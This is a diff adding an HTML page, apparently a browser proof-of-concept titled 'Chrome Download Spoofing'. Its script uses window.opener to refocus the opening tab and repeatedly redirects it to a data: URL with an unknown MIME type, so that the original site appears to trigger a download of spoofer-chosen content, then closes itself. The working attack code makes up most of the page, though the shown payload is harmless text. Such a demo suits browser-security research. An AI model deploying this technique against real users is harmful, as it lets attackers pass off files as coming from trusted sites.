@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Chrome Download Spoofing</title>
+</head>
+<body>
+    Spoofing opener
+
+    <a href="/index.html">Go back</a>
+    <script>
+            let attempts = 0
+            let id = setInterval( () => {
+                window.opener.window.focus();
+                if(attempts > 3) {
+                    clearInterval(id)
+                    window.close();
+                }
+                window.opener.location.href = 'data:foo/bar,# This is a message from spoofer'
+                attempts++
+            }, 500)
+    </script>
+</body>
+</html>
